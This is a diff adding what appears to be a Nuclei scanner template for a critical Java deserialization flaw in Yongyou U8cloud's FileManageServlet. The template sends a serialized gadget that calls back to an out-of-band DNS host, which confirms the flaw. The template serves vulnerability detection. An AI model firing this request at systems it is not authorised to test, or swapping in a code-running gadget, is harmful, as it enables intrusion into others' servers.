@@ -1,0 +1,25 @@
+id: yongyou-u8cloud-filemanageservlet-deserialization
+info:
+  name: Yongyou U8cloud FileManageServlet Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, deserialization
+http:
+  - raw:
+      - |
+        POST /servlet/~uap/nc.impl.pub.filesystem.FileManageServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-java-serialized-object
+
+        {{java_dns_url_gadget(interactsh-url, "raw")}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "nc.impl.pub.filesystem.FileManageServlet"
